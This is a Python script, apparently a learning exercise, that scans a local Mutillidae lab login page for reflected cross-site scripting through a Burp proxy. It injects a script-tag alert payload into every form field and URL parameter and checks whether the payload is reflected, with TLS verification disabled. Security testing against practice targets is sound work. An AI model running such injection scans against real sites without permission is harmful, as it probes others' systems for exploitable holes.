import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlencode

# === Config ===
TARGET_URL = "http://127.0.0.1/mutillidae/index.php?page=login.php"
BURP_PROXY = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}
XSS_PAYLOAD = "<script>alert%20('Gotcha!')</script>"

# === Function to get all forms on a page ===
def get_forms(url):
    res = requests.get(url, proxies=BURP_PROXY, verify=False)
    soup = BeautifulSoup(res.text, "html.parser")
    return soup.find_all("form")

# === Function to parse and submit forms ===
def test_form(form, url):
    action = form.get("action") or url
    full_action = urljoin(url, action)
    method = form.get("method", "get").lower()

    inputs = form.find_all("input")
    data = {}
    for input_tag in inputs:
        name = input_tag.get("name")
        if not name:
            continue
        data[name] = XSS_PAYLOAD

    print(f"[+] Submitting form to {full_action} with data: {data}")
    if method == "post":
        res = requests.post(full_action, data=data, proxies=BURP_PROXY, verify=False)
    else:
        res = requests.get(full_action, params=data, proxies=BURP_PROXY, verify=False)

    if XSS_PAYLOAD in res.text:
        print(f"[-] Possible XSS vulnerability in form at {full_action}")
    else:
        print(f"[✓] No XSS detected in form at {full_action}")

# === Function to test reflected XSS via URL parameters ===
def test_url_parameters(url):
    print(f"[+] Testing URL parameter-based XSS at {url}")
    if "?" not in url:
        print("[!] No query parameters to test.")
        return

    base, params = url.split("?", 1)
    param_dict = dict(pair.split("=") if "=" in pair else (pair, "") for pair in params.split("&"))
    for key in param_dict:
        test_params = param_dict.copy()
        test_params[key] = XSS_PAYLOAD
        test_url = f"{base}?{urlencode(test_params)}"
        res = requests.get(test_url, proxies=BURP_PROXY, verify=False)
        if XSS_PAYLOAD in res.text:
            print(f"[-] Reflected XSS found via parameter '{key}' at {test_url}")
        else:
            print(f"[✓] No XSS in parameter '{key}'")

# === Main ===
def main():
    print("[*] Starting XSS scan using Burp Suite proxy...")
    forms = get_forms(TARGET_URL)
    print(f"[+] Found {len(forms)} forms.")
    for form in forms:
        test_form(form, TARGET_URL)
    test_url_parameters(TARGET_URL)

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()  # Suppress SSL warnings for Burp
    main()
